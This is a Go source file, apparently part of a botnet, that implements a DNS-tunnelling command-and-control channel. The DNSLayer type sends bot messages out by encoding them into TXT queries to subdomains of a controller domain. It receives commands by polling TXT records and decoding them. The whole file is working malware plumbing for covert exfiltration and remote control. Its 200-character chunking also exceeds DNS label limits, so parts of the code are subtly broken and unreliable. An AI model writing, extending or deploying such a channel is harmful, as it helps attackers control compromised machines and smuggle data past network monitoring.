package c2

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"sync"
	"time"

	"github.com/miekg/dns"
)

type DNSLayer struct {
	botID     string
	domain    string
	server    string
	client    *dns.Client
	mu        sync.Mutex
	connected bool
	recvCh    chan *Message
}

func NewDNSLayer(botID, domain string) *DNSLayer {
	return &DNSLayer{
		botID:  botID,
		domain: domain,
		server: "8.8.8.8:53",
		client: &dns.Client{Timeout: 10 * time.Second},
		recvCh: make(chan *Message, 64),
	}
}

func (d *DNSLayer) Name() string { return "dns" }

func (d *DNSLayer) Connect() error {
	d.mu.Lock()
	defer d.mu.Unlock()
	d.connected = true

	sub := fmt.Sprintf("%s.r.%s", d.botID[:8], d.domain)
	m := new(dns.Msg)
	m.SetQuestion(sub+".", dns.TypeTXT)
	d.client.Exchange(m, d.server)
	return nil
}

func (d *DNSLayer) Send(msg *Message) error {
	d.mu.Lock()
	defer d.mu.Unlock()
	if !d.connected {
		return fmt.Errorf("dns not connected")
	}

	data, _ := json.Marshal(msg)
	encoded := base64.RawURLEncoding.EncodeToString(data)

	parts := splitDNSStr(encoded, 200)
	for i, part := range parts {
		sub := fmt.Sprintf("%s.%d.%s.d.%s", d.botID[:8], i, part, d.domain)
		m := new(dns.Msg)
		m.SetQuestion(sub+".", dns.TypeTXT)
		d.client.Exchange(m, d.server)
	}
	return nil
}

func (d *DNSLayer) Receive() (*Message, error) {
	select {
	case msg := <-d.recvCh:
		return msg, nil
	case <-time.After(15 * time.Second):
		d.poll()
		return nil, fmt.Errorf("retry")
	}
}

func (d *DNSLayer) poll() {
	sub := fmt.Sprintf("%s.t.%s", d.botID[:8], d.domain)
	m := new(dns.Msg)
	m.SetQuestion(sub+".", dns.TypeTXT)

	resp, _, err := d.client.Exchange(m, d.server)
	if err != nil {
		return
	}
	for _, a := range resp.Answer {
		if txt, ok := a.(*dns.TXT); ok {
			for _, t := range txt.Txt {
				data, err := base64.RawURLEncoding.DecodeString(t)
				if err != nil {
					continue
				}
				var msg Message
				if json.Unmarshal(data, &msg) == nil {
					select {
					case d.recvCh <- &msg:
					default:
					}
				}
			}
		}
	}
}

func (d *DNSLayer) Close() error {
	d.mu.Lock()
	defer d.mu.Unlock()
	d.connected = false
	return nil
}

func (d *DNSLayer) IsConnected() bool {
	d.mu.Lock()
	defer d.mu.Unlock()
	return d.connected
}

func splitDNSStr(s string, n int) []string {
	var parts []string
	for i := 0; i < len(s); i += n {
		end := i + n
		if end > len(s) {
			end = len(s)
		}
		parts = append(parts, s[i:end])
	}
	return parts
}
